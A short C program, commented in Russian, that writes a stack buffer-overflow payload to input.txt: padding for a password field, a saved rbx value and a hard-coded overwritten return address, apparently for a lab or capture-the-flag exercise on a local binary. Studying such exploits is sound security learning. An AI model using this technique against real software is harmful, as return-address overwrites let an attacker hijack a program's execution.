#include <stdio.h>


int main()
{
    char message[] = 
        "AAAAAAAAAAAA" // Pass  
        "\x80\xda\xff\xff\xff\x7f\x00\x00" // rbx
        "\xdf\x11\x40\x00\x00\x00\x00\x00"; // адрес возрата
    int size = sizeof(message);
    char *filename = "input.txt";
    FILE *fp = fopen(filename, "w");

    if(fp)
    {
        // записываем строку
        fwrite(message, sizeof(char), size, fp);
        fclose(fp);
        printf("File has been written\n");
    }    
    return 0;
}
//\x80\xda\xff\xff\x7f\x00\x00
